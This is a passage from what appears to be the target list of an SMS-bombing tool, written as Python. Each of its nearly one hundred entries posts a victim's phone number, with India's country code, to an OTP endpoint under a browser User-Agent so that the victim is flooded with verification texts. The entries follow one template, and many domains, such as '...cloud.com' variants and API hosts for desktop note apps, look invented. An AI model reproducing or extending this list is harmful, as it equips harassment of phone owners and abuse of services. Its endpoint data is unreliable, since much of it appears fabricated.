    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 663
{
    'name': 'QOwnNotes_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.qownnotes.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 664
{
    'name': 'CherryTree_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.cherrytree.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 665
{
    'name': 'TreePad_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.treepad.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 666
{
    'name': 'KeyNote_NF_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.keynotenf.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 667
{
    'name': 'Tomboy_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.tomboy.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 668
{
    'name': 'Gnote_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.gnote.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 669
{
    'name': 'RedNotebook_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.rednotebook.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 670
{
    'name': 'LifePIM_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.lifepim.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 671
{
    'name': 'EssentialPIM_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.essentialpim.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 672
{
    'name': 'MyLifeOrganized_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.mylifeorganized.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 673
{
    'name': 'Todoist_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.todoist.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 674
{
    'name': 'TickTick_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.ticktick.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 675
{
    'name': 'Microsoft_ToDo_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.todo.microsoft.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 676
{
    'name': 'Google_Tasks_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.tasks.google.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 677
{
    'name': 'Wunderlist_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.wunderlist.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 678
{
    'name': 'AnyDo_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.anydo.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 679
{
    'name': 'RememberTheMilk_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.rememberthemilk.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 680
{
    'name': 'Toodledo_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.toodledo.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 681
{
    'name': 'Evernote_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.evernote.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 682
{
    'name': 'OneNote_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.onenote.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 683
{
    'name': 'Apple_Notes_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.notes.apple.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 684
{
    'name': 'Google_Keep_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.keep.google.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 685
{
    'name': 'Simplenote_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.simplenote.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 686
{
    'name': 'StandardNotes_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.standardnotes.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 687
{
    'name': 'Joplin_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.joplin.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 688
{
    'name': 'Laverna_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.laverna.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 689
{
    'name': 'Turtl_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.turtl.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 690
{
    'name': 'Paperwork_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.paperwork.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 691
{
    'name': 'TagSpaces_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.tagspaces.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 692
{
    'name': 'QOwnNotes_Cloud_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.qownnotescloud.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 693
{
    'name': 'CherryTree_Cloud_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.cherrytreecloud.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 694
{
    'name': 'TreePad_Cloud_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.treepadcloud.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 695
{
    'name': 'KeyNote_Cloud_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.keynotecloud.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 696
{
    'name': 'Tomboy_Cloud_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.tomboycloud.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 697
{
    'name': 'Gnote_Cloud_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.gnotecloud.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 698
{
    'name': 'RedNotebook_Cloud_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.rednotebookcloud.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 699
{
    'name': 'LifePIM_Cloud_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.lifepimcloud.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 700
{
    'name': 'EssentialPIM_Cloud_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.essentialpimcloud.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 701
{
    'name': 'MyLifeOrganized_Cloud_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.mylifeorganizedcloud.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 702
{
    'name': 'Todoist_Cloud_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.todoistcloud.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 703

{
    'name': 'TickTick_Cloud_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.ticktickcloud.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 704
{
    'name': 'Microsoft_ToDo_Cloud_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.todomicrosoftcloud.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 705
{
    'name': 'Google_Tasks_Cloud_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.tasksgooglecloud.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 706
{
    'name': 'Wunderlist_Cloud_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.wunderlistcloud.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 707
{
    'name': 'AnyDo_Cloud_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.anydocloud.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 708
{
    'name': 'RememberTheMilk_Cloud_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.rememberthemilkcloud.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 709
{
    'name': 'Toodledo_Cloud_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.toodledocloud.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 710
{
    'name': 'Evernote_Cloud_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.evernotecloud.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 711
{
    'name': 'OneNote_Cloud_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.onenotecloud.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 712
{
    'name': 'Apple_Notes_Cloud_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.notesapplecloud.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 713
{
    'name': 'Google_Keep_Cloud_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.keepgooglecloud.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 714
{
    'name': 'Simplenote_Cloud_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.simplenotecloud.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 715
{
    'name': 'StandardNotes_Cloud_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.standardnotescloud.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 716
{
    'name': 'Joplin_Cloud_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.joplincloud.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 717
{
    'name': 'Laverna_Cloud_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.lavernacloud.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 718
{
    'name': 'Turtl_Cloud_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.turtlcloud.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 719
{
    'name': 'Paperwork_Cloud_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.paperworkcloud.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 720
{
    'name': 'TagSpaces_Cloud_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.tagspacescloud.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 721
{
    'name': 'Miro_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.miro.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 722
{
    'name': 'Mural_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.mural.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 723
{
    'name': 'Lucidspark_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.lucidspark.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 724
{
    'name': 'Stormboard_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.stormboard.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 725
{
    'name': 'Conceptboard_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.conceptboard.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 726
{
    'name': 'Sketchboard_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.sketchboard.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 727
{
    'name': 'Mindmeister_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.mindmeister.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 728
{
    'name': 'Mindomo_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.mindomo.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 729
{
    'name': 'XMind_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.xmind.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 730
{
    'name': 'Coggle_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.coggle.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 731
{
    'name': 'Lucidchart_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.lucidchart.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 732
{
    'name': 'SmartDraw_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.smartdraw.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 733
{
    'name': 'Draw.io_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.drawio.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 734
{
    'name': 'Creately_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.creately.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 735
{
    'name': 'Gliffy_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.gliffy.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 736
{
    'name': 'Whimsical_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.whimsical.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 737
{
    'name': 'Scribblar_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.scribblar.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 738
{
    'name': 'Twiddla_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.twiddla.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 739
{
    'name': 'Bubble_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.bubble.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 740
{
    'name': 'Adalo_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.adalo.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 741
{
    'name': 'Glide_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.glide.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 742
{
    'name': 'OutSystems_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.outsystems.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 743
{
    'name': 'Mendix_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.mendix.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 744
{
    'name': 'PowerApps_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.powerapps.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 745
{
    'name': 'Appian_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.appian.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 746
{
    'name': 'Pega_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.pega.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 747
{
    'name': 'Salesforce_Platform_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.salesforceplatform.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 748
{
    'name': 'ServiceNow_Platform_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.servicenowplatform.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 749
{
    'name': 'Zoho_Creator_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.zohocreator.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 750
{
    'name': 'Airtable_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.airtable.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 751
{
    'name': 'Smartsheet_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.smartsheet.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 752
{
    'name': 'Monday_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.monday.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 753
{
    'name': 'ClickUp_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.clickup.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 754
{
    'name': 'Asana_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.asana.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 755
{
    'name': 'Trello_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.trello.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 756
{
